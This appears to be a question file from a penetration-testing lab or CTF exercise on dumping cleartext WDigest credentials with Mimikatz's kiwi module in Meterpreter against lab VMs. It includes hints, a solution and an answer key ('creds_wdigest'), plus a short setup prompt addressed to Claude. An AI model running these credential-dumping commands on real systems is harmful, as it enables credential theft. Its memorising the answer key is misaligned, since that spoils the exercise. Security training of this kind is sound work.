# Q052 — Mimikatz via Meterpreter

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🔴 Hard |
| **Tools** | `metasploit`, `hydra`, `john`, `hashcat`, `linpeas`, `mimikatz` |
| **Time budget** | 15–25 min |

---

## 📝 Question

After SYSTEM on Win7, load kiwi and run `creds_all`. Report command used to dump cleartext WDigest.

---

## 🎯 Flag Format

```
cmd=<mimikatz-cmd>
```

Example: `cmd=creds_wdigest`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`meterpreter > load kiwi` then `creds_wdigest`.
</details>

<details>
<summary>Hint 2</summary>

WDigest may be disabled on patched Win7.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
load kiwi
creds_wdigest
```

Dumps any cached cleartext passwords.

**Answer:** `cmd=creds_wdigest`

📖 Ref: [tools/mimikatz.md](../../tools/mimikatz.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q052".
```
